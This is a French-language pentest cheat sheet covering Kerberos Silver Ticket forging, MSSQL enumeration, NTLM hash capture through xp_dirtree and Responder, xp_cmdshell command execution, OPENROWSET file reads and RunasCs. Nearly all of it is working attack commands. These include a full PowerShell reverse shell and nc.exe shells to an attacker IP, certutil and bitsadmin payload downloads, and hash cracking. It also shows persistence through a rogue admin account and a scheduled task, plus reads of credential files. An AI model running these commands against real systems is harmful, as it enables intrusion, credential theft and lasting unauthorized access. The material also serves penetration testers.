# Silver Ticket

Forge d'un ticket TGS Kerberos pour accéder à un service spécifique sans contacter le DC.

## Prérequis

- Hash NTLM du compte de service
- Domain SID
- Service Principal Name (SPN)

## Énumération

### 1. Calculer le hash NTLM du mot de passe

```bash
python3 -c 'import hashlib; print(hashlib.new("md4", "PASSWORD".encode("utf-16le")).hexdigest())'
```

### 2. Obtenir le Domain SID

```sql
# Via MSSQL
SELECT SUSER_SID();

# Convertir hex en SID lisible
# 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
# → S-1-5-21-4089266779-1167590040-2748827309-1103
# Domain SID: S-1-5-21-4089266779-1167590040-2748827309
```

```bash
# Via rpcclient
rpcclient -U "user%password" <DC_IP>
rpcclient $> lsaquery
```

```powershell
# Via PowerShell
(Get-ADDomain).DomainSID.Value
```

### 3. Identifier les groupes privilégiés

```sql
# Récupérer le RID d'un groupe
SELECT SUSER_SID('DOMAIN\GroupName');
```

### 4. Construire le SPN

| Service | Format |
|---------|--------|
| MSSQL | `MSSQLSvc/hostname.domain.com:1433` |
| CIFS | `cifs/hostname.domain.com` |
| HTTP | `HTTP/hostname.domain.com` |
| LDAP | `ldap/hostname.domain.com` |

## Exploitation

### Générer le ticket

```bash
impacket-ticketer \
  -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> \
  -spn <SPN> \
  -groups <GROUP_RIDs> \
  -user-id <USER_RID> \
  <USERNAME>
```

**Exemple:**
```bash
impacket-ticketer \
  -nthash a1b2c3d4e5f6... \
  -domain-sid "S-1-5-21-123456789-123456789-123456789" \
  -domain CORP.LOCAL \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  -groups 512,1105 \
  -user-id 500 \
  Administrator
```

### Utiliser le ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
mssqlclient.py -k -no-pass hostname.domain.com
```

## RIDs importants

| RID | Nom |
|-----|-----|
| 500 | Administrator |
| 512 | Domain Admins |
| 519 | Enterprise Admins |
| 544 | Administrators (local) |

## Notes

- Pas de communication avec le DC (stealthy)
- Valide tant que le compte de service existe
- Le groupe RID doit avoir les permissions sur le service ciblé

---
# MSSQL - Enumeration

Reconnaissance et énumération d'un serveur MSSQL.

## Connexion

```bash
# SQL Auth
mssqlclient.py username:'password'@<TARGET>

# Windows Auth
mssqlclient.py DOMAIN/user:'password'@<TARGET> -windows-auth

# Pass-the-Hash
mssqlclient.py -hashes :<NTLM> DOMAIN/user@<TARGET> -windows-auth

# Kerberos
export KRB5CCNAME=/path/to/ticket.ccache
mssqlclient.py -k -no-pass hostname.domain.com
```

## Informations serveur

```sql
-- Version
SELECT @@VERSION;

-- Détails serveur
SELECT 
    SERVERPROPERTY('MachineName') AS machine,
    SERVERPROPERTY('ServerName') AS server,
    SERVERPROPERTY('Edition') AS edition;

-- Utilisateur actuel
SELECT SYSTEM_USER;
SELECT CURRENT_USER;

-- Base de données actuelle
SELECT DB_NAME();
```

## Privilèges

```sql
-- Vérifier sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Tous les rôles serveur
SELECT 
    'sysadmin' AS role, IS_SRVROLEMEMBER('sysadmin') AS is_member
UNION ALL SELECT 'serveradmin', IS_SRVROLEMEMBER('serveradmin')
UNION ALL SELECT 'securityadmin', IS_SRVROLEMEMBER('securityadmin')
UNION ALL SELECT 'dbcreator', IS_SRVROLEMEMBER('dbcreator');

-- Permissions effectives
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

## Utilisateurs et rôles

```sql
-- Tous les logins
SELECT name, type_desc, is_disabled FROM sys.server_principals
WHERE type IN ('S','U','G');

-- Membres sysadmin
SELECT r.name AS role_name, mp.name AS member_name
FROM sys.server_role_members srm
JOIN sys.server_principals r ON srm.role_principal_id = r.principal_id
JOIN sys.server_principals mp ON srm.member_principal_id = mp.principal_id
WHERE r.name = 'sysadmin';
```

## Bases de données

```sql
-- Lister toutes les bases
SELECT name, state_desc FROM sys.databases;

-- Avec détails
SELECT name, database_id, create_date, compatibility_level
FROM sys.databases
ORDER BY name;
```

## Tables et données

```sql
-- Tables de la base actuelle
SELECT TABLE_SCHEMA, TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
ORDER BY TABLE_SCHEMA, TABLE_NAME;

-- Rechercher colonnes sensibles
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%'
   OR COLUMN_NAME LIKE '%pwd%'
   OR COLUMN_NAME LIKE '%hash%';
```

## Configuration

```sql
-- Configurations importantes
SELECT name, value_in_use
FROM sys.configurations
WHERE name IN (
    'xp_cmdshell',
    'Ad Hoc Distributed Queries',
    'Ole Automation Procedures',
    'clr enabled'
);

-- Toutes les configurations
SELECT name, value, value_in_use FROM sys.configurations;
```

## Linked Servers

```sql
EXEC sp_linkedservers;

SELECT name, product, provider, data_source
FROM sys.servers
WHERE is_linked = 1;
```

## Sessions actives

```sql
SELECT 
    session_id, login_name, host_name, program_name, login_time
FROM sys.dm_exec_sessions
WHERE is_user_process = 1;
```
---
# MSSQL - Hash Capture (xp_dirtree)

Forcer MSSQL à s'authentifier sur un partage SMB pour capturer le hash NTLM du compte de service.

## Prérequis

- Accès MSSQL (même guest)
- Responder en écoute
- Connectivité réseau SMB

## Exploitation

### 1. Lancer Responder

```bash
sudo responder -I tun0
```

### 2. Connexion MSSQL

```bash
mssqlclient.py username:'password'@<TARGET>
# ou avec Windows auth
mssqlclient.py DOMAIN/user:'password'@<TARGET> -windows-auth
```

### 3. Forcer authentification SMB

```sql
-- Méthode principale
EXEC xp_dirtree '\\<ATTACKER_IP>\share';

-- Alternatives
EXEC xp_fileexist '\\<ATTACKER_IP>\share\file.txt';
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share';
```

### 4. Capturer le hash

Responder affiche:
```
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : DOMAIN\serviceaccount
[SMB] NTLMv2-SSP Hash     : serviceaccount::DOMAIN:...
```

### 5. Cracker le hash

```bash
# Sauvegarder le hash
echo "serviceaccount::DOMAIN:..." > hash.txt

# Cracker avec hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Variantes

### Via xp_cmdshell

```sql
EXEC xp_cmdshell 'net use \\<ATTACKER_IP>\share';
```

### Via BACKUP

```sql
BACKUP DATABASE master TO DISK = '\\<ATTACKER_IP>\share\backup.bak';
```

## Notes

- Fonctionne même avec compte guest
- Pas besoin de privilèges sysadmin
- Windows envoie automatiquement le hash NTLM lors de connexions UNC
- Hash capturé = compte qui exécute le service SQL

---

# MSSQL - xp_cmdshell

Exécution de commandes système Windows depuis MSSQL.

## Prérequis

- Privilèges `sysadmin` sur MSSQL

## Activation

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## Commandes de base

```sql
-- Vérifier l'utilisateur
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';

-- Informations système
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'systeminfo';

-- Réseau
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'netstat -ano';

-- Fichiers
EXEC xp_cmdshell 'dir C:\';
EXEC xp_cmdshell 'type C:\path\to\file.txt';
```

## Reverse Shell

### PowerShell

```bash
# Sur attaquant
nc -lvnp 4444

# Sur cible
EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''<ATTACKER_IP>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

### Netcat

```sql
-- Télécharger nc.exe
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<ATTACKER_IP>/nc.exe C:\temp\nc.exe';

-- Reverse shell
EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444';
```

## Téléchargement de fichiers

```sql
-- Via certutil
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<ATTACKER_IP>/file.exe C:\temp\file.exe';

-- Via PowerShell
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<ATTACKER_IP>/file.exe -OutFile C:\temp\file.exe"';

-- Via bitsadmin
EXEC xp_cmdshell 'bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/file.exe C:\temp\file.exe';
```

## Persistence

```sql
-- Créer utilisateur admin
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- Scheduled task
EXEC xp_cmdshell 'schtasks /create /tn "TaskName" /tr "C:\malware.exe" /sc onlogon /ru System';
```

## Notes

- Nécessite sysadmin
- Commandes s'exécutent avec les permissions du service SQL
- Souvent désactivé par défaut
- Très détectable (logs, EDR)

---

# MSSQL - OPENROWSET

Lecture de fichiers système via MSSQL sans xp_cmdshell.

## Prérequis

- Privilèges `sysadmin`
- Ad Hoc Distributed Queries activé

## Activation

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;
```

## Lecture de fichiers

### Syntaxe de base

```sql
SELECT * FROM OPENROWSET(
    BULK '<FILE_PATH>',
    SINGLE_CLOB  -- ou SINGLE_BLOB pour binaires
) AS x;
```

### Exemples

```sql
-- Fichier texte
SELECT * FROM OPENROWSET(
    BULK 'C:\Windows\System32\drivers\etc\hosts',
    SINGLE_CLOB
) AS x;

-- Historique PowerShell
SELECT * FROM OPENROWSET(
    BULK 'C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',
    SINGLE_CLOB
) AS x;

-- Web.config
SELECT * FROM OPENROWSET(
    BULK 'C:\inetpub\wwwroot\web.config',
    SINGLE_CLOB
) AS x;
```

## Fichiers intéressants

```
# Credentials
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Users\<USER>\.bash_history
C:\Windows\System32\inetsrv\config\applicationHost.config

# Configuration
C:\inetpub\wwwroot\web.config
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini

# Logs
C:\inetpub\logs\LogFiles\W3SVC1\*.log
```

## Filtrer le contenu

```sql
-- Rechercher mots de passe dans l'historique
SELECT value
FROM OPENROWSET(
    BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',
    SINGLE_CLOB
) AS x
CROSS APPLY STRING_SPLIT(CAST(BulkColumn AS VARCHAR(MAX)), CHAR(13)+CHAR(10))
WHERE value LIKE '%password%'
   OR value LIKE '%pwd%'
   OR value LIKE '%ConvertTo-SecureString%';
```

## Alternatives si OPENROWSET bloqué

### Via xp_cmdshell

```sql
EXEC xp_cmdshell 'type C:\file.txt';
```

### Via BULK INSERT

```sql
CREATE TABLE #temp (content VARCHAR(MAX));
BULK INSERT #temp FROM 'C:\file.txt';
SELECT * FROM #temp;
DROP TABLE #temp;
```

## Notes

- Plus discret que xp_cmdshell
- Nécessite sysadmin
- Permissions du service SQL s'appliquent
- Ad Hoc Distributed Queries souvent désactivé

---

# RunasCs

Exécution de processus avec les credentials d'un autre utilisateur Windows.

## Installation

```bash
# Télécharger
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

# Transférer sur cible
python3 -m http.server 8080

# Sur cible (via xp_cmdshell)
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>:8080/RunasCs.exe C:\temp\runascs.exe';
```

## Syntaxe

```cmd
RunasCs.exe <username> <password> <command> [options]
```

## Options principales

| Option | Description |
|--------|-------------|
| `-d <domain>` | Domaine |
| `-l <logon_type>` | Type de logon (9 par défaut) |
| `-r <host:port>` | Reverse shell |

### Logon Types

| Type | Usage |
|------|-------|
| 2 | Interactive (GUI) |
| 3 | Network (SMB, WinRM) |
| 9 | NewCredentials (recommandé) |

## Exemples

### Commande simple

```cmd
RunasCs.exe Administrator "P@ssw0rd" whoami
RunasCs.exe Administrator "P@ssw0rd" "cmd /c dir C:\" -d DOMAIN
```

### Reverse Shell PowerShell

```bash
# Sur attaquant
nc -lvnp 4444

# Sur cible
RunasCs.exe Administrator "P@ssw0rd" powershell.exe -r <ATTACKER_IP>:4444
```

### Avec Netcat

```cmd
RunasCs.exe Administrator "P@ssw0rd" "C:\temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444"
```

### Via MSSQL xp_cmdshell

```sql
-- Télécharger RunasCs
EXEC xp_cmdshell 'mkdir C:\temp';
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>/RunasCs.exe C:\temp\runascs.exe';

-- Reverse shell
EXEC xp_cmdshell 'C:\temp\runascs.exe Administrator P@ssw0rd powershell.exe -r <ATTACKER_IP>:4444';
```

## Logon type spécifique

```cmd
# Interactive
RunasCs.exe user "password" notepad.exe -l 2

# Network
RunasCs.exe user "password" "net use \\server\share" -l 3

# NewCredentials (défaut)
RunasCs.exe user "password" cmd.exe -l 9
```

## Notes

- Alternative à `runas` avec support réseau
- Logon type 9 (NewCredentials) recommandé par défaut
- Peut être détecté par AV/EDR
- Event ID 4648 (Windows) lors de l'utilisation

---



